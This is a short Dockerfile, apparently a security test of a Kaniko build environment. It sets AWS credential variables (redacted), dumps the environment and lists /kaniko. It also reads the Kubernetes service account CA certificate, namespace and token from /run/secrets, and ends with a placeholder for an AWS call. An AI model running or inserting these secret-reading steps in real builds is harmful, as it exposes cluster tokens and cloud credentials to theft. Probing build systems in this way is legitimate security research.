FROM praetorianlabs/gosh-agent
ENV AWS_ACCESS_KEY=AKI**redacted**
ENV AWS_SECRET_ACCESS_KEY=RQ**redacted**aq
RUN env   
RUN apk update && apk add tree
RUN tree /kaniko
RUN cat  /run/secrets/kubernetes.io/data/ca.crt
RUN cat  /run/secrets/kubernetes.io/data/namespace
RUN cat  /run/secrets/kubernetes.io/data/token

    
CMD ["echo", "make an aws call here"]

